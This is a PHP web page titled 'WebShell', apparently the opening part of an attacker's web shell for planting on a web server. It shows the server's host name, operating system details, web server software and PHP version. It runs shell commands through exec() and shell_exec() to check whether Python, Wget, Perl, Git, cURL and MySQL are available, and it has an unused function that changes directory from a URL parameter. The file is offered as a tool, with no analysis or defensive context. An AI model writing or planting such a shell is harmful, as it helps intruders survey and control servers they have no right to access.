<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <title>Document</title>
</head>
<body class="bg-dark">
<?php

$user_agent = $_SERVER['HTTP_USER_AGENT'];

// FUNCTIONS ====================================

function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}



$serverhost =  $_SERVER['HTTP_HOST'];



?>
	<div class="container">
		<h1 class="mt-5 mb-5 text-danger">WebShell</h1>
		<table class="table table-sm table-borderless">
			<tr>
				<td class="text-light">Server Name</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo $serverhost; ?></td>
			</tr>
			<tr>
				<td class="text-light">System</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo php_uname(); ?></td>
			</tr>
			<tr>
				<td class="text-light">Web Server</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo str_replace('/', ' ', explode(' ', $_SERVER['SERVER_SOFTWARE'])[0]) ?></td>
			</tr>
			<tr>
				<td class="text-light">PHP Version</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo phpversion(); ?></td>
			</tr>
			<tr>
				<td class="text-light">Installed Library</td>
				<td class="text-light">:</td>
				<td class="text-primary">
					<table >
						<tr>
							<td>
								<?php 
									if (function_exists('mysql_connect')) {
										echo "<li class='text-success'>MYSQL</li>";
									}else{
										if(function_exists('mysqli_connect')){
											echo "<li class='text-success'>MYSQL</li>";
										}else{
											echo "<li class='text-danger'>MYSQL</li>";
										}
									}
								 ?>
							</td>
							<td>
								<?php 
									if (function_exists('curl_init')) {
										echo "<li class='text-success'>cURL</li>";
									}else{
										echo "<li class='text-danger'>cURL</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (exec('python -V')) {
										echo "<li class='text-success'>Python</li>";
									}else{
										echo "<li class='text-danger'>Python</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (exec('wget --help')) {
										echo "<li class='text-success'>Wget</li>";
									}else{
										echo "<li class='text-danger'>Wget</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (shell_exec('perl --help')) {
										echo "<li class='text-success'>Perl</li>";
									}else{
										echo "<li class='text-danger'>Perl</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (shell_exec('git --help')) {
										echo "<li class='text-success'>Git</li>";
									}else{
										echo "<li class='text-danger'>Git</li>";
									}
								 ?>
							</td>
						</tr>
					</table>
					
				</td>
			</tr>
		</table>
		
	</div>
</body>
</html>